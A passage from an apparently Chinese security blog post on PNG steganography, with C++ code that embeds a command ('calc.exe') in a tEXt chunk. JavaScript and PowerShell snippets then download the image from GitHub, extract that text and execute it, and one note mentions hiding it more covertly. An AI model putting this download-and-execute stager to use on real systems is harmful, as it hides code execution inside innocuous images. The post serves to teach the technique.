+        printf(&quot;   ChunkOffset:0x%08x    \n&quot;,ChunkOffset);
+        printf(&quot;   ChunkLen: %10d        \n&quot;,ChunkLen);
+        crc32=GetCrc32(buf,ChunkLen+4);
+        printf(&quot;   ExpectCRC32:%08X\n&quot;,crc32);
+        fread(buf,4,1,fp);
+        ChunkCRC32=(buf[0]&lt;&lt;24)|(buf[1]&lt;&lt;16)|(buf[2]&lt;&lt;8)|buf[3];
+        printf(&quot;   ChunkCRC32: %08X        &quot;,ChunkCRC32);
+        if(crc32!=ChunkCRC32)
+            printf(&quot;[!]CRC32Check Error!\n&quot;);
+        else
+        {
+            printf(&quot;Check Success!\n\n&quot;);
+            if(j==0)
+                fwrite(buf,4,1,fpnew);
+        }
+        ChunkLen=ftell(fp);
+        if(ChunkLen==(len-12))
+        {
+            printf(&quot;\n----------------------------------------------------\n&quot;);
+            printf(&quot;Total Chunk:%d\n&quot;,i);        
+            break;
+        }
+    }
+    fwrite(IEND,12,1,fpnew);
+    fclose(fp);
+    fclose(fpnew);
+    return 0;    
+}
+</code></pre><p>如图，左边为原始PNG文件大小，右边为去掉所有辅助数据块后的文件，仍然可以正常浏览</p>
+<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2016-7-15/2-10.png" alt="Alt text"></p>
+<h2 id="0x06-写入Payload"><a href="#0x06-写入Payload" class="headerlink" title="0x06 写入Payload"></a>0x06 写入Payload</h2><hr>
+<p><strong>实例：</strong></p>
+<p>按照辅助数据块的格式写入Payload</p>
+<p>写入的Payload为:</p>
+<pre><code>calc.exe
+</code></pre><p>辅助数据块设置为：</p>
+<pre><code>tEXt
+</code></pre><p>对应的完整数据块结构如下：</p>
+<pre><code>Length:                00 00 00 08
+Chunk Type Code：    74 45 58 74
+Chunk Data：            63 61 6c 63 2e 65 78 65
+CRC：                fa c4 08 76
+</code></pre><p>写入的十六进制数据如下：</p>
+<pre><code>00 00 00 08 74 45 58 74 63 61 6c 63 2e 65 78 65 fa c4 08 76
+</code></pre><p><strong>注：</strong><br>本实例仅作演示，实际使用可换成其他数据块，更加隐蔽</p>
+<h3 id="1、工具实现-1"><a href="#1、工具实现-1" class="headerlink" title="1、工具实现"></a>1、工具实现</h3><p>使用<code>Hex Editor</code>插入数据，如图</p>
+<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2016-7-15/2-11.PNG" alt="Alt text"></p>
+<p>保存后，不影响PNG文件浏览</p>
+<h3 id="2、程序实现-1"><a href="#2、程序实现-1" class="headerlink" title="2、程序实现"></a>2、程序实现</h3><p>去掉PNG文件所有的辅助数据块后，写入payload数据块tEXt</p>
+<p>保存为addpayload.cpp,完整代码：</p>
+<pre><code>#include&lt;stdio.h&gt;
+#include&lt;string.h&gt;
+
+unsigned int GetCrc32(unsigned char* InStr,unsigned int len){        
+    unsigned int Crc32Table[256];      
+    unsigned int i,j;        
+    unsigned int Crc;        
+    for (i = 0; i &lt; 256; i++){        
+        Crc = i;        
+        for (j = 0; j &lt; 8; j++){        
+            if (Crc &amp; 1)        
+                Crc = (Crc &gt;&gt; 1) ^ 0xEDB88320;        
+            else       
+                Crc &gt;&gt;= 1;      
+        }        
+        Crc32Table[i] = Crc;        
+    }        
+
+    Crc=0xffffffff;        
+    for(unsigned int m=0; m&lt;len; m++){          
+        Crc = (Crc &gt;&gt; 8) ^ Crc32Table[(Crc &amp; 0xFF) ^ InStr[m]];        
+    }     
+
+    Crc ^= 0xFFFFFFFF;     
+    return Crc;        
+}        
+
+void convertStrToUnChar(char* str, unsigned char* UnChar)  
+{  
+    int i = strlen(str), j = 0, counter = 0;  
+    char c[2];  
+    unsigned int bytes[2];  
+
+    for (j = 0; j &lt; i; j += 2)   
+    {  
+        if(0 == j % 2)  
+        {  
+            c[0] = str[j];  
+            c[1] = str[j + 1];  
+            sscanf(c, &quot;%02x&quot; , &amp;bytes[0]);  
+            UnChar[counter] = bytes[0];  
+            counter++;  
+        }  
+    }  
+    return;  
+}     
+
+void AddPayload(FILE *fp)
+{
+    char *Payload=&quot;calc.exe&quot;;
+    unsigned char *buf;
+    int len;
+    int crc32;
+    len=strlen(Payload);    
+    buf=new unsigned char[len+12];
+    buf[0]=len&gt;&gt;24&amp;0xff;
+    buf[1]=len&gt;&gt;16&amp;0xff;
+    buf[2]=len&gt;&gt;8&amp;0xff;
+    buf[3]=len&amp;0xff;
+    buf[4]=&#39;t&#39;;
+    buf[5]=&#39;E&#39;;
+    buf[6]=&#39;X&#39;;
+    buf[7]=&#39;t&#39;;
+    for(int j=0;j&lt;len;j++)
+        buf[j+8]=Payload[j];
+    buf[len+8]=0XFA;
+    buf[len+9]=0XC4;
+    buf[len+10]=0X08;
+    buf[len+11]=0X76;
+    fwrite(buf,len+12,1,fp);
+}
+
+int main(int argc, char* argv[])
+{
+    FILE *fp,*fpnew;   
+    unsigned char *buf=NULL;
+    unsigned int len=0;
+    unsigned int ChunkLen=0;
+    unsigned int ChunkCRC32=0;
+    unsigned int ChunkOffset=0;    
+    unsigned int crc32=0;
+    unsigned int i=0,j=0;
+    unsigned char Signature[8]={0x89,0x50,0x4e,0x47,0x0d,0x0a,0x1a,0x0a};    
+    unsigned char IEND[12]={0x00,0x00,0x00,0x00,0x49,0x45,0x4e,0x44,0xae,0x42,0x60,0x82};       
+
+    if((fp=fopen(&quot;c:\\test\\test.png&quot;,&quot;rb+&quot;))==NULL)
+        return 0;  
+    if((fpnew=fopen(&quot;c:\\test\\new.png&quot;,&quot;wb&quot;))==NULL)
+        return 0;  
+    fseek(fp,0,SEEK_END);
+    len=ftell(fp);
+    buf=new unsigned char[len];
+    fseek(fp,0,SEEK_SET);
+    fread(buf,len,1,fp);
+    printf(&quot;Total Len=%d\n&quot;,len);
+    printf(&quot;----------------------------------------------------\n&quot;);
+    fseek(fp,8,SEEK_SET);
+    ChunkOffset=8;
+    i=0; 
+    fwrite(Signature,8,1,fpnew);
+    while(1)
+    {
+        i++;
+        j=0;
+        memset(buf,0,len);
+        fread(buf,4,1,fp);
+        fwrite(buf,4,1,fpnew);
+        ChunkLen=(buf[0]&lt;&lt;24)|(buf[1]&lt;&lt;16)|(buf[2]&lt;&lt;8)|buf[3];
+        fread(buf,4+ChunkLen,1,fp);
+        printf(&quot;[+]ChunkName:%c%c%c%c        &quot;,buf[0],buf[1],buf[2],buf[3]);
+        if(strncmp((char *)buf,&quot;IHDR&quot;,4)==0|strncmp((char *)buf,&quot;PLTE&quot;,4)==0|strncmp((char *)buf,&quot;IDAT&quot;,4)==0)
+        {    
+            printf(&quot;Palette Chunk\n&quot;);
+
+            fwrite(buf,4+ChunkLen,1,fpnew);
+        }
+        else
+        {
+            printf(&quot;Ancillary Chunk\n&quot;);
+            fseek(fpnew,-4,SEEK_CUR);
+            j=1;
+        }
+        printf(&quot;   ChunkOffset:0x%08x    \n&quot;,ChunkOffset);
+        printf(&quot;   ChunkLen: %10d        \n&quot;,ChunkLen);
+        crc32=GetCrc32(buf,ChunkLen+4);
+        printf(&quot;   ExpectCRC32:%08X\n&quot;,crc32);
+        fread(buf,4,1,fp);
+        ChunkCRC32=(buf[0]&lt;&lt;24)|(buf[1]&lt;&lt;16)|(buf[2]&lt;&lt;8)|buf[3];
+        printf(&quot;   ChunkCRC32: %08X        &quot;,ChunkCRC32);
+        if(crc32!=ChunkCRC32)
+            printf(&quot;[!]CRC32Check Error!\n&quot;);
+        else
+        {
+            printf(&quot;Check Success!\n\n&quot;);
+            if(j==0)
+                fwrite(buf,4,1,fpnew);
+        }
+        ChunkLen=ftell(fp);
+        if(ChunkLen==(len-12))
+        {
+            printf(&quot;\n----------------------------------------------------\n&quot;);
+            printf(&quot;Total Chunk:%d\n&quot;,i);        
+            break;
+        }
+    }
+    AddPayload(fpnew);
+    fwrite(IEND,12,1,fpnew);
+    fclose(fp);
+    fclose(fpnew);
+    return 0;    
+}
+</code></pre><p>使用check.cpp对其进行校验，如图，校验成功</p>
+<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2016-7-15/2-12.PNG" alt="Alt text"></p>
+<h2 id="0x07-读取payload并执行"><a href="#0x07-读取payload并执行" class="headerlink" title="0x07 读取payload并执行"></a>0x07 读取payload并执行</h2><hr>
+<p>将添加payload的图片上传至github，在客户端实现读取图片解析payload并执行：</p>
+<h3 id="1、javascript"><a href="#1、javascript" class="headerlink" title="1、javascript"></a>1、javascript</h3><pre><code>h = new ActiveXObject(&quot;WinHttp.WinHttpRequest.5.1&quot;);
+h.SetTimeouts(0, 0, 0, 0);
+h.Open(&quot;GET&quot;,&quot;https://raw.githubusercontent.com/3gstudent/PNG-Steganography/master/new.png&quot;,false);
+h.Send();
+Data = h.ResponseText;
+x=Data.indexOf(&quot;tEXt&quot;);
+y=Data.indexOf(&quot;IEND&quot;);
+str=Data.substring(x+4,y-8);
+new ActiveXObject(&quot;WScript.Shell&quot;).Run(str); 
+</code></pre><h3 id="2、powershell"><a href="#2、powershell" class="headerlink" title="2、powershell"></a>2、powershell</h3><pre><code>$url = &#39;https://raw.githubusercontent.com/3gstudent/PNG-Steganography/master/new.png&#39;
+$request = New-Object System.Net.WebCLient
+$bytes = $request.DownloadString($url)
+$x=$bytes.indexof(&quot;tEXt&quot;)
+$y=$bytes.indexof(&quot;IEND&quot;)
+$str=$bytes.Substring($x+4,$y-$x-12)
+Start-Process -FilePath $str
+</code></pre><p><strong>注:</strong></p>
+<p>这里给出两种方法，仅作演示</p>
+<h2 id="0x08-小结"><a href="#0x08-小结" class="headerlink" title="0x08 小结"></a>0x08 小结</h2><hr>
+<p>本文详细介绍分析了PNG文件的格式，编写程序实现以下功能：</p>
+<ul>
+<li><p>自动解析PNG文件格式，辅助查找其中的隐藏内容</p>
+</li>
+<li><p>添加Payload</p>
+</li>
+<li><p>下载PNG图片解析并执行payload</p>
+</li>
+</ul>
+<hr>
+<p><a href="https://github.com/3gstudent/feedback/issues/new" target="_blank" rel="noopener">LEAVE A REPLY</a></p>
+
+                
+<p class="red-link-context">
+    <a href="14a5d4dd.html" rel="next" title="隐写技巧——PNG文件中的LSB隐写">
+    上一篇：隐写技巧——PNG文件中的LSB隐写
+  </a>
+</p>
+
+
+
+<p class="red-link-context">
+    <a href="a942458e.html" rel="next" title="DLL劫持漏洞自动化识别工具Rattler测试">
+    下一篇：DLL劫持漏洞自动化识别工具Rattler测试
+  </a>
+</p>
+
+
+            </div>
+			
+        </div>
+    </div>
+	
+</article>
+
+<!-- JiaThis Button BEGIN -->
+<div class="jiathis_style_32x32">
+	<a class="jiathis_button_qzone"></a>
+	<a class="jiathis_button_tsina"></a>
+	<a class="jiathis_button_tqq"></a>
+	<a class="jiathis_button_weixin"></a>
+	<a class="jiathis_button_renren"></a>
+	<a href="http://www.jiathis.com/share?uid=2157721" class="jiathis jiathis_txt jtico jtico_jiathis" target="_blank"></a>
+	<a class="jiathis_counter_style"></a>
+</div>
+<script type="text/javascript">
+var jiathis_config = {data_track_clickback:'true'};
+</script>
+<script type="text/javascript" src="http://v3.jiathis.com/code_mini/jia.js?uid=2157721" charset="utf-8"></script>
+<!-- JiaThis Button END -->
+
+<!-- ������City�氲װ���� -->
+<div id="lv-container" data-id="city" data-uid="MTAyMC8zNDIxOS8xMDc1Nw==">
+	<script type="text/javascript">
+   (function(d, s) {
+       var j, e = d.getElementsByTagName(s)[0];
+
+       if (typeof LivereTower === 'function') { return; }
+
+       j = d.createElement(s);
+       j.src = 'https://cdn-city.livere.com/js/embed.dist.js';
+       j.async = true;
+
+       e.parentNode.insertBefore(j, e);
+   })(document, 'script');
+	</script>
+<noscript> Ϊ����ʹ�����������۹����뼤��JavaScript</noscript>
+</div>
+<!-- City�氲װ��������� -->
+
+ 
+</div>
+
+        <div class="fixed-action-btn float-sitemap">
+    <a class="btn-floating btn-large red">
+      <i class="fa fa-caret-square-o-up"></i>
+    </a>
+    <ul>
+      <li><a class="btn-return-top btn-floating waves-effect brown" title="回到顶部"><i class="fa fa-arrow-circle-o-up"></i></a></li>
+      <li><a class="btn-floating waves-effect button-collapse indigo"  data-activates="main-menu" title="菜单"><i class="fa fa-navicon"></i></a></li>
+    </ul>	
+  </div>
+	
+    </main>
+    
+  
+
+<script type="text/javascript" src="http://imagestp.cfyqy.com/cfyqy/pet/js/jquery.min.js"></script>
+<script type="text/javascript" src="http://imagestp.cfyqy.com/cfyqy/pet/js/spig.js"></script>
+<link rel="stylesheet" href="http://imagestp.cfyqy.com/cfyqy/pet/css/spigPet.css" type="text/css"/>
+<script type="text/javascript">
+var isindex = true;
+var visitor = true;
+</script>
+<div >
+<!--小人只在首页显示 start*-->
+<div id="spig" class="spig">
+    <div id="message">正在加载中……</div>
+    <div id="mumu" class="mumu"></div>
+</div>
+</div>
+<!--小人end*-->
+ 
+<footer class="page-footer indigo darken-1 darken-1">
+	
+    <div class="footer-container container">
+        <div class="row">
+            
+            <div class="social-group col m4 s12">
+                <h5 class="white-text">社交</h5>
+                
+                    <a class="social-link" href="" target="_blank">
+                        <i class="fa fa-2x fa-weibo"></i>
+                    </a>
+                
+                    <a class="social-link" href="" target="_blank">
+                        <i class="fa fa-2x fa-github"></i>
+                    </a>
+                
+                    <a class="social-link" href="/atom.xml" target="_blank">
+                        <i class="fa fa-2x fa-rss"></i>
+                    </a>
+                
+                
+    <script async src="//dn-lbstatics.qbox.me/busuanzi/2.3/busuanzi.pure.mini.js">
+    </script>
+    <div class="site-visitors-container white-text">
+        <span>
+            <i class="fa fa-user"></i>
+            <span class="busuanzi-value" id="busuanzi_value_site_uv"></span>
+        </span>
+        <span>&nbsp;|&nbsp;</span>
+        <span>
+            <i class="fa fa-eye"></i>
+            <span class="busuanzi-value" id="busuanzi_value_site_pv"></span>
+        </span>
+    </div>
+
+
+            </div>
+            
+           
+            <div class="col m8 s12">
+                <h5 class="white-text">友情链接</h5>
+                
+                    <a class="social-link" href="http://www.itxueke.com/SecNavi/#3782" target="_blank">IT学客安全导航</a>
+                
+            </div>
+            
+        </div>
+    </div>
+    
+    <div class="footer-copyright red-link-context">
+        <div class="container">
+            © just do !
+        </div>
+    </div>
+	
+</footer>
+
+	
+
+<script>(function(i,s,o,g,r,a,m){i["DaoVoiceObject"]=r;i[r]=i[r]||function(){(i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;a.charset="utf-8";m.parentNode.insertBefore(a,m)})(window,document,"script",('https:' == document.location.protocol ? 'https:' : 'http:') + "//widget.daovoice.io/widget/APP_ID.js","daovoice");</script>
+<script>
+  daovoice('init', {
+    app_id: "45fb937d",
+  });
+  daovoice('update');
+</script>
+  <noscript>
+    <div class="noscript">
+        <p class="center-align">当前网速较慢或者你使用的浏览器不支持博客特定功能，请尝试刷新或换用Chrome、Firefox等现代浏览器</p>
+    </div>
+</noscript>
+<div class="noscript">
+    <p class="center-align">当前网速较慢或者你使用的浏览器不支持博客特定功能，请尝试刷新或换用Chrome、Firefox等现代浏览器</p>
+</div>
+
+
+<script src="/js/jquery.min.js"></script>
+<script src="/js/materialize.min.js"></script>
+
+<script>
+    (function($) {
+        $(document).ready(function() {
+            // 隐藏禁用javascript（针对微信内置浏览器）的提示
+            $('.noscript').hide();
+
+            // 图片缩放效果
+            var $imgs = $('img').not('.slider-image').not('.avatar-image').not('.carousel-image').not('.card-cover-image').not('.qrcode');
+
+            // 给图片加上点击放大效果（materialbox插件）
+            $imgs.addClass('materialboxed').each(function(i, el) {
+                $(this).attr('data-caption', $(this).attr('alt') || ' ');
+            }).materialbox();
+
+            // 优化表格的显示
+            $('table').each(function() {
+                var $table = $(this);
+                // 除去多行代码的情况
+                if ($table.find('pre').length == 0) {
+                    $table.addClass('responsive-table striped bordered');
+                }
+            });
+
+            // 首页幻灯片
+            $('.slider').slider({indicators: true, full_width: true, interval: 8000});
+
+            $(".button-collapse").sideNav();
+            $(".category-menu").sideNav();
+
+            // 针对gallery post
+            $('.carousel').carousel({full_width: true});
+            $('.carousel-control.prev').click(function() {
+                $('.carousel').carousel('prev');
+            });
+            $('.carousel-control.next').click(function() {
+                $('.carousel').carousel('next');
+            });
+
+            // 文章目录
+            $('article').not('.simple-article').find('h1').add('h2').add('h3').add('h4').add('h5').add('h6').scrollSpy();
+
+            // 目录随屏幕滚动（防止目录过长越过footer）
+            var $toc = $('.toc');
+            var scrollTargetTop = 0;
+            $(window).scroll(function() {
+                var $activeLink = $toc.find('a.active.section');
+                if ($(window).scrollTop() < 100) {
+                    scrollTargetTop = 0;
+                } else {
+                    if ($activeLink[0]) {
+                        scrollTargetTop = $activeLink.offset().top - $toc.offset().top;
+                    }
+                }
+                $toc.css('top', '-' + scrollTargetTop + 'px');
+            });
+
+            // 修正文章目录的left-border颜色
+            var color = $('.table-of-contents-text').css('color');
+            $('.table-of-contents-link').css('border-left-color', color);
+
+            // 针对移动端做的优化：FAB按钮点击一下收回
+            if (/Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent)) {
+                $('.fixed-action-btn').addClass('click-to-toggle');
+            }
+            // 回到顶部
+            $('.btn-return-top').click(function() {
+                $('body, html').animate({
+                    scrollTop: 0
+                }, 500);
+            });
+
+            // 重置读书页面的Tab标签页的颜色
+            $('li.tab a').hover(function() {
+                $(this).toggleClass('text-lighten-4');
+            });
+            $('.indicator').addClass(' lighten-2');
+
+            
+            // 添加new标签
+            $('.menu-reading, .menu-about').append('<span class="new badge red"></span>');
+            
+
+            // 搜索功能
+            $('.modal-trigger').leanModal({
+                // 打开搜索框时自动聚焦
+                ready: function() {
+                    if ($('#search').is(":visible")) {
+                        $('#search-input').focus();
+                    }
+                }
+            });
+            var searchXml = "search.xml";
+            if (searchXml.length == 0) {
+             	searchXml = "search.xml";
+            }
+            var searchPath = "/" + searchXml;
+            initSearch(searchPath, 'search-input', 'search-result');
+        });
+
+        // 初始化搜索与匹配函数
+        var initSearch = function(path, search_id, content_id) {
+            'use strict';
+            $.ajax({
+                url: path,
+                dataType: "xml",
+                success: function(xmlResponse) {
+                    // get the contents from search data
+                    var datas = $("entry", xmlResponse).map(function() {
+                        return {
+                            title: $("title", this).text(),
+                            content: $("content", this).text(),
+                            url: $("url", this).text()
+                        };
+                    }).get();
+                    var $input = document.getElementById(search_id);
+                    var $resultContent = document.getElementById(content_id);
+                    $input.addEventListener('input', function() {
+                        var str = '<ul class=\"search-result-list\">';
+                        var keywords = this.value.trim().toLowerCase().split(/[\s\-]+/);
+                        $resultContent.innerHTML = "";
+                        if (this.value.trim().length <= 0) {
+                            return;
+                        }
+                        // perform local searching
+                        datas.forEach(function(data) {
+                            var isMatch = true;
+                            var content_index = [];
+                            var data_title = data.title.trim().toLowerCase();
+                            var data_content = data.content.trim().replace(/<[^>]+>/g, "").toLowerCase();
+                            var data_url = data.url;
+                            var index_title = -1;
+                            var index_content = -1;
+                            var first_occur = -1;
+                            // only match artiles with not empty titles and contents
+                            if (data_title != '' && data_content != '') {
+                                keywords.forEach(function(keyword, i) {
+                                    index_title = data_title.indexOf(keyword);
+                                    index_content = data_content.indexOf(keyword);
+                                    if (index_title < 0 && index_content < 0) {
+                                        isMatch = false;
+                                    } else {
+                                        if (index_content < 0) {
+                                            index_content = 0;
+                                        }
+                                        if (i == 0) {
+                                            first_occur = index_content;
+                                        }
+                                    }
+                                });
+                            }
+                            // show search results
+                            if (isMatch) {
+                                keywords.forEach(function(keyword) {
+                                    var regS = new RegExp(keyword, "gi");
+                                    data_title = data_title.replace(regS, "<span class=\"search-keyword red lighten-2\">" + keyword + "</span>");
+                                });
+
+                                str += "<li><a href='" + data_url + "' class='search-result-title'>" + data_title + "</a>";
+                                var content = data.content.trim().replace(/<[^>]+>/g, "");
+                                if (first_occur >= 0) {
+                                    // cut out 100 characters
+                                    var start = first_occur - 20;
+                                    var end = first_occur + 80;
+                                    if (start < 0) {
+                                        start = 0;
+                                    }
+                                    if (start == 0) {
+                                        end = 100;
+                                    }
+                                    if (end > content.length) {
+                                        end = content.length;
+                                    }
+                                    var match_content = content.substring(start, end);
+                                    // highlight all keywords
+                                    keywords.forEach(function(keyword) {
+                                        var regS = new RegExp(keyword, "gi");
+                                        match_content = match_content.replace(regS, "<span class=\"search-keyword red lighten-2\">" + keyword + "</span>");
+                                    });
+
+                                    str += "<p class=\"search-result\">..." + match_content + "...</p>"
+                                }
+                                str += "</li>";
+                            }
+                        });
+                        str += "</ul>";
+                        $resultContent.innerHTML = str;
+                    });
+                }
+            });
+        }
+    })(jQuery);
+</script>
+
+
+<script src="/js/prettify.js"></script>
+<script type="text/javascript">
+    $(document).ready(function() {
+        $("pre").addClass("prettyprint");
+        prettyPrint();
+    });
+</script>
+
+
+<script>
+    (function(i,s,o,g,r,a,m){i['GoogleAnalyticsObject']=r;i[r]=i[r]||function(){
+        (i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),
+            m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m)
+    })(window,document,'script','//www.google-analytics.com/analytics.js','ga');
+
+    ga('create', '119424621', 'auto');
+    ga('send', 'pageview');
+
+</script>
+
+
+
+<script type="text/javascript" src="http://tajs.qq.com/stats?sId=65311650" charset="UTF-8"></script>
+
+
+
+<script type="text/x-mathjax-config">
+MathJax.Hub.Config({
+  tex2jax: {inlineMath: [['$','$'], ['\\(','\\)']]}
+});
+</script>
+<script type="text/javascript" async
+  src="//cdn.mathjax.org/mathjax/latest/MathJax.js?config=TeX-MML-AM_CHTML">
+</script>
+
+
+<script>
+(function(){
+    var bp = document.createElement('script');
+    var curProtocol = window.location.protocol.split(':')[0];
+    if (curProtocol === 'https'){
+   bp.src = 'https://zz.bdstatic.com/linksubmit/push.js';
+  }
+  else{
+  bp.src = 'http://push.zhanzhang.baidu.com/push.js';
+  }
+    var s = document.getElementsByTagName("script")[0];
+    s.parentNode.insertBefore(bp, s);
+})();
+</script>
+
+	
+</body>
+</html>
